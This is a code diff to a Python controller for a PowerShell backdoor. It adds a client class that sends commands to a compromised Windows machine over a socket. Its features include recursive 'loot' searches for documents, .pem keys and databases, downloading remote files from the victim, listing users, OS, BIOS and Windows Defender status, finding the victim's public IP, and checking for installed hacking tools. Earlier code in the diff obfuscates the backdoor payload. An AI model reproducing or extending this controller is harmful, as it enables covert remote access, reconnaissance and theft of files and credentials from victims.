@@ -44,6 +44,154 @@ POWERSHELL_SCRIPT_OBJECTS: list = [
     "createTextStream"
 ]
 
+class Client:
+    def __init__(self, connection_tuple: tuple, config) -> None:
+        self.config = config
+        self.connection = connection_tuple[0] 
+        self.address = connection_tuple[1]
+        self.features = {
+            "get_tools": self.get_tools,
+            "get_public_ip": self.get_public_ip,
+            "get_file": self.download_remote_file,
+            "get_loot": self.get_loot,
+            "print_help": self.print_help,
+            "get_users": self.get_users,
+            "get_os":self.get_os,
+            "get_bios":self.get_bios,
+            "get_antivirus":self.get_antivirus
+        }
+
+    def run_powershell_command(self, command) -> None:
+        self.connection.sendto(command.encode(), self.config.ip_tuple)
+        print(format_string(self.recvall()))
+
+    def get_loot(self, command) -> None:
+        """ Searches a directory for intresting files
+        """
+        try: 
+            directory = command.split(" ")[1]
+        except:
+            return
+        command = f'Get-ChildItem {directory} -Recurse -Include *.doc, *.pdf, *.json, *.pem, *.xlsx, *.xls, *.csv, *.txt ,*.db, *.exe'
+        self.run_powershell_command(command)
+
+    def get_users(self, command = None) -> None:
+        """ Lists all users on the local computer
+        """
+        command = "Get-LocalUser | Select * | Out-String"
+        self.run_powershell_command(command)
+
+    def get_bios(self, command = None) -> None:
+        """ Gets the BIOS's manufacturer name, bios name, and firmware type
+        """
+        command = "Get-ComputerInfo | select BiosManufacturer, BiosName, BiosFirmwareType  | Out-String"
+        self.run_powershell_command(command)
+
+    def get_active(self, command = None) -> None:
+        """ Lists active TCP connections
+        """ 
+        command = "Get-NetTCPConnection -State Listen  | Out-String"
+        self.run_powershell_command(command)
+
+    def get_os(self, command = None) -> None:
+        """ Gets infomation about the current OS build
+        """
+        command = "Get-ComputerInfo | Select OsManufacturer, OsArchitecture, OsName, OSType, OsHardwareAbstractionLayer, WindowsProductName, WindowsBuildLabEx | Out-String"
+        self.run_powershell_command(command)
+
+    def get_antivirus(self, command = None) -> None:
+        """ Gets infomation about Windows Defender
+        """
+        command = "Get-MpComputerStatus | Select AntivirusEnabled, AMEngineVersion, AMProductVersion, AMServiceEnabled, AntispywareSignatureVersion, AntispywareEnabled, IsTamperProtected, IoavProtectionEnabled, NISSignatureVersion, NISEnabled, QuickScanSignatureVersion, RealTimeProtectionEnabled, OnAccessProtectionEnabled, DefenderSignaturesOutOfDate | Out-String"
+        self.run_powershell_command(command)
+
+    def print_help(self, command = None):
+        print("""
+Command         Description
+
+get_antivirus - Gets infomation about Windows Defender
+get_os        - Gets infomation about the current OS build
+get_active    - Lists active TCP connections
+get_bios      - Gets the BIOS's manufacturer name, bios name, and firmware type
+get_public_ip - Makes a network request to api.ipify.org to and returns the computers public IP address
+get_loot      - Searches a directory for intresting files (May take awhile) ... Syntax: get_loot <DIR>
+get_tools     - Checks to see what tools are installed on the system
+get_file      - Downloads a remote file and saves it to your computer ... Syntax: get_file <REMOTE_FILE> <LOCAL_FILE>
+get_users     - Lists all users on the local computer
+    """)
+
+    def get_tools(self, command = None):
+        """  Checks to see what tools are installed on the system
+        """
+        tools = [    "nmap -h",    "nc -h",    "wireshark -v",    "python3 -V",    "python -V",    "perl -V",    "ruby -h",    "hashcat -h",    "john -h",    "airmon-ng -h",    "wifite -h",    "sqlmap -h",    "ssh -V",    "gdb -h",    "radare2 -h",    "dig -h",    "whois -h",    "gcc -v",    "g++ -v",    "make -v",    "zip -h",    "unzip -h",    "curl -V",    "wget -V",    "tcpdump -h",    "nikto -h",    "dirb -h",    "hydra -h",    "nbtscan -h",    "netcat -h",    "recon-ng -h",    "sublist3r -h",    "amass -h",    "masscan -h",    "sqlninja -h",    "metasploit --version",    "aircrack-ng -h",   "ettercap -h",    "dsniff -h",    "driftnet -h",    "tshark --version"]
+        print("[*] Listing Installed tools below")
+        for tool in tools:
+            self.connection.sendto(tool.encode(), self.config.ip_tuple)
+            content = format_string(self.recvall())
+            if " " in tool:
+                tool = tool.split(" ")[0]
+            if content:
+                print(f"{tool}")
+
+    def get_public_ip(self, command = None) -> None:
+        """ Fetches the users public IP Address
+        """
+        self.connection.sendto('(Invoke-WebRequest -uri "https://api.ipify.org/").Content | Out-String'.encode(), self.config.ip_tuple)
+        print(format_string(self.recvall()))
+
+
+    def __send_fake_request(self) -> None:
+        """ Sends a request to reset the loop
+        """
+        self.connection.sendto("ls | Out-Null".encode(), self.config.ip_tuple)
+
+    def download_remote_file(self, command) -> bool:
+        """ Downloads a remote file from a backdoor session
+        :param command: Command to read the file location from
+        :return: True if the file was downloaded 
+        """
+        command = command.split(" ")
+        try:
+            file_location = command[2]
+            remote_file = command[1]
+        except:
+            print("Downloads a remote file and saves it to your local computer \nsyntax: get_file <remote_path> <local_path>\nPlease use absolute paths!")
+            self.__send_fake_request()
+            return False
+        self.connection.sendto(f"Get-Content -Path {remote_file}".encode(), self.config.ip_tuple)
+        data = self.recvall()
+        return save_content_to_file(data.decode(), file_location)
+
+    def recvall(self) -> bytes:
+        """ Receives all data in a socket connection
+        :return: A byte object containing all the recieved data
+        """
+        data: bytes = b""
+        while True:
+            part = self.connection.recv(READ_AMOUNT)
+            # print(len(part))
+            data += part
+            if len(part) < READ_AMOUNT:
+                # either 0 or end of data
+                break
+        return data
+
+    def process_additional_feature(self, command):
+        """ Handles any external commands 
+        :param command: Command to examine
+        :return: True if the command was handled within the client class
+        """
+        command_function_requested = command
+        if " " in command:
+            command_function_requested = command.split(" ")[0]
+        if command and "--help" not in command:
+            command_function = self.features.get(command_function_requested)
+            if not command_function:
+                return False
+            command_function(command)
+            return True
+        return False
+
 class Backdoor:
     def __init__(self, config: Config) -> None:
         """ Creates the backdoor
@@ -107,9 +255,9 @@ class Backdoor:
         self.sock.bind(self.config.ip_tuple)
         while True:
             self.sock.listen(1)
-            connection, address = self.sock.accept()
-            self.print_verbose_message(f"Recieved connection from {address[0]}:{address[1]}")
-            self.handle_client(connection)
+            client = Client(self.sock.accept(), self.config)
+            self.print_verbose_message(f"Recieved connection from {client.address[0]}:{client.address[1]}")
+            self.handle_client(client)
 
     def obfuscate_backdoor(self) -> bool:
         """ obfuscates the backdoor source template.ps1
@@ -126,15 +274,15 @@ class Backdoor:
         backdoor = backdoor.replace("0.0.0.0", self.config.ip_address)
         return save_content_to_file(backdoor, self.config.out_file)
 
-    def handle_client(self, connection) -> None:
+    def handle_client(self, client) -> None:
         """ Handles an active backdoor session
         :param connection: Active backdoor session
         """
-        print("[*] Connected, press [enter] to start the session")
+        print(LOGO)
         try:
             while True:
                 time.sleep(.5)
-                prompt = format_string(connection.recv(READ_AMOUNT))
+                prompt = format_string(client.recvall())
 
                 command = input(f"{prompt.strip()} ")
 
@@ -142,49 +290,14 @@ class Backdoor:
                     command += "ls | Out-Null"
 
                 time.sleep(.5)
-                connection.sendto(command.encode(), self.config.ip_tuple)
-                if "get_file" in command and "--help" not in command:
-                    self.download_remote_file(command, connection)
-                    continue
-                print(format_string(self.recvall(connection)))
+                if not client.process_additional_feature(command) :
+                    client.run_powershell_command(command)
 
         # Disconnect
         except ConnectionResetError:
             return
 
-    def download_remote_file(self, command , connection) -> bool:
-        """ Downloads a remote file from a backdoor session
-        :param command: Command to read the file location from
-        :param connection: Active backdoor session
-        :return: True if the file was downloaded 
-        """
-        command = command.split(" ")
-        try:
-            file_location = command[2]
-        except KeyError:
-            print("Downloads a remote file and saves it to your local computer \nsyntax: get_file <remote_path> <local_path>\nPlease use absolute paths!")
-            return False
-        data = self.recvall(connection)
-        if save_content_to_file(data.decode(), file_location):
-            self.print_verbose_message(f"Saved content {len(data)} to {file_location}")
-        return True
 
-    def recvall(self, connection) -> bytes:
-        """ Receives all data in a socket connection
-        :param connection: Connection to read data from
-        :param data: Previous data parts
-        :return: A byte object containing all the recieved data
-        """
-        data: bytes = b""
-        while True:
-            part = connection.recv(READ_AMOUNT)
-            # print(len(part))
-            data += part
-            if len(part) < READ_AMOUNT:
-                # either 0 or end of data
-                self.print_verbose_message(f"done recv {len(data)}")
-                break
-        return data
 
     def print_verbose_message(self, message: str, prefix: str = "*") -> None:
         """ Prints a verbose message
